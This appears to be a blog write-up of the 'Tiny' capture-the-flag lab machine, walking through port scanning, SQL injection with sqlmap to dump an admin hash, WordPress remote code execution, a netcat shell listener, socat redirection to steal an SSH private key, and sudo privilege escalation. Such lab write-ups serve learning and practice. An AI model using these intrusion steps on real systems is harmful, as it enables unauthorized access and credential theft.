---
title: Tiny Writeup
date: 2024-02-11
categories:
  - Writeups
tags:
  - Sql_injection
  - Wordpress
  - Privilege_Escalation
---

# Arp-scan 

 Detecting the IP of the machine

```bash
192.168.1.97	08:00:27:ee:8a:18	PCS Systemtechnik GmbH
```


# Ports

Starting with port scanning by using nmap

```bash
root@kali ~ [SIGINT]# nmap  -sC 192.168.1.97 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-10 06:17 EST
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 91.04% done; ETC: 06:17 (0:00:00 remaining)
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.76% done; ETC: 06:17 (0:00:00 remaining)
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.44% done; ETC: 06:17 (0:00:00 remaining)
Nmap scan report for tiny (192.168.1.97)
Host is up (0.0012s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
80/tcp   open  http
|_http-generator: WordPress 6.3.1
|_http-title: Blog
| http-robots.txt: 15 disallowed entries 
| /wp-admin/ /cgi-bin/ /private/ /temp/ /backup/ /old/ 
| /test/ /dev/ / /misc/ /downloads/ /doc/ /documents/ 
|_/restricted/ /confidential/
8888/tcp open  sun-answerbook
MAC Address: 08:00:27:EE:8A:18 (Oracle VirtualBox virtual NIC)
```

We can see that 80, 22 and 8888 ports are opened

# Add Hosts

![](/assets/img/tiny/website.png)

We are able to see that the website is loading contents in domain tiny.hmv, and hence we need to add the domain into /etc/hosts , so that it can resolve properly (virtual hosting).

```shell
echo "192.168.1.97  tiny.hmv" >> /etc/hosts
```

# Url Enumeration

As usual, firstly, we will check whether there is robots.txt

From robots.txt:

```shell
# Additional sitemap references
Sitemap: http://tiny.hmv/sitemap.xml
Sitemap: http://wish.tiny.hmv/sitemap.xml
```

We are able to find that there is a subdomain which is called "wish.tiny.hmw"

# Sql injection

Check whether the website is vulnerable to sqli (sql injection)

![](/assets/img/tiny/burp.png)

It appears that Sqli is existed on the website and there we use sqlmap to enumerate the user and the password in the database:

```shell
sqlmap -r req.req --batch -D wish_db -T admin -C id,password,username --dump 
```

Results:

```shell
Database: wish_db                                                         
Table: admin
[1 entry]
+----+--------------------------------------------+----------+
| id | password                                   | username |
+----+--------------------------------------------+----------+
| 1  | 8df4387dd1598d4dcf237f9443028cec           | umeko    |
+----+--------------------------------------------+----------+

```

*Not going to show the decrypted password, as the content of the decrypted password is offensive*

# Shell 

Logging into the website and using wpscan, we can detect that the website is vulnerable to  [CVE-2023-5201](https://github.com/advisories/GHSA-52wg-h24c-3wgr), which we can do Remote Code Execution.

![](/assets/img/tiny/wordpress_cve.png)

We listen to port 1234 by using nc (netcat) and get the shell

```bash
nc -nlvp 1234
```

Upgrading simple shells to fully interactive TTYs

```shell
/usr/bin/script -qc /bin/bash /dev/null
export TERM=xterm
```

Referring to the port scanning result earlier, we notice that port 8888 is opened as well and yet to be used, hence we can make a smart assumption.

```shell
ss -tulnp
ps -elf 
```

![](/assets/img/tiny/ps.png)

![](/assets/img/tiny/ss.png)

We can see that TinyProxy is running

By accessing  /etc/tinyproxy/tinyproxy.conf, we can the configurations

```shell
cat /etc/tinyproxy/tinyproxy.conf | grep -v "#"
```

![](/assets/img/tiny/config.png)

From that, we can see that port 1111 is opened, and all traffic is being directed to "localhost:1111"

If all the traffics is being directed to port 1111, we can make an assumption and listen to port 1111 by using "nc", from the response we can see that "Get http://127.0.0.1:8000/id_rsa".

Hence we can do a redirection of traffic from port 1111 to 8000 by using "Socat" 

```
socat -v tcp-listen:1111;reuseaddr tcp:localhost:8000
```

and hence we are able to get the private key, saving and naming it as "id_rsa"

![[/assets/img/tiny/private_key.png]]

granting "id_rsa" with 600 permission and we connect user vic by using "id_rsa" via ssh

```shell
chmod 600 id_rsa
ssh -i id_rsa vic@127.0.0.1
```

# Root Access

 After accessing user "vic", we are able to get our first flag.

![](/assets/img/tiny/user_flag.png)

By doing sudo -l, we can see that we can use sudo command to execute /opt/car.py

![](/assets/img/tiny/permissions.png)

We see what it is contained in "car.py" file and we can see "pydash lib", which we can find a Command Injection vulnerability  

```shell
cat car.py
```

![](/assets/img/tiny/car_py_content.png)

By doing this, we are able to get Root Permission and get the flag

![](/assets/img/tiny/privilege_escalation.png)
